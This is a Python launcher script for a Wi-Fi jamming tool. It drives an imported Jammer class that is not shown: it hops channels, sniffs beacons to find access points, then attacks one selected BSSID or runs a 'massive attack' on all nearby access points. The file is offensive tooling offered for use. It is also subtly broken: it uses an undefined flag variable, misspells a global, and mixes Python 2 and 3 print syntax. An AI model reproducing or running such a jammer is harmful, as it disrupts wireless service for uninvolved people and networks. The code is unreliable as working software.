import argparse
import signal
import logging
from Jammer import Jammer
from multiprocessing import Process

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

HOPER = None #Var to store process that changes the channel
ATACKER = None #Var to store process that sends the packages
JAMMER = None #Var to store Jammer instance

def setArgs():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-i',
        '--interface',
        required=True,
        type=str,
        help=('Indicates the interface used to jamm')
    )

    parser.add_argument(
        '-aAp',
        '--allAccesspoints',
        help = ("Acts over all the available acces points"),
        action='store_true'
    )

    return parser.parse_args()

def stopHopper(m_signal, frame):
    HOPER.terminate()
    HOPER.join()
    JAMMER.stop_channel_hop()

def main():
    global HOPER
    global ATTACKER
    global JAMMER
    ARGS = setArgs()

    JAMMER = Jammer(ARGS.interface)

    if not allAccesspoints:
        print("Press CTRL+C to stop sniffing...")
        print("="*100 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel', 'ESSID','BSSID') + '='*100)

        # HOPER jumps in wifi channels
        HOPER = JAMMER.get_channel_hop_process()
        HOPER.start()

        # Jammer.sniff filters beacon packages to find access points
        JAMMER.sniff()

        signal.signal(signal.SIGINT, stopHopper)

        ATTACKER = JAMMER.selectBSSID()
        ATTACKER.start()

    else:
        ## creates Hoper and Sniffer processes to scan all available AP
        Hoper = JAMMER.get_channel_hop_cycle_process()
        Hoper.start()

        Sniffer = Process(target= JAMMER.sniff)
        Sniffer.start()

        # While the proccess doesn't finish it will be in the cycle
        while not JAMMER.get_stop_sniff():
            print "."

        #Once the process finishes and we have saved all the AP terminate the process and start the massive attack
        Hoper.terminate()
        Hoper.join()
        Sniffer.terminate()
        Sniffer.join()

        ## Starts massive attack
        Attacker = Process(target = JAMMER.attackBSSID)
        Attacker.start()


    signal.signal(signal.SIGINT, exit)


def exit(m_signal, frame):
    JAMMER.stop_attack()
    if ATTACKER:
        ATTACKER.terminate()
        ATTACKER.join()

if __name__ == "__main__":
    main()
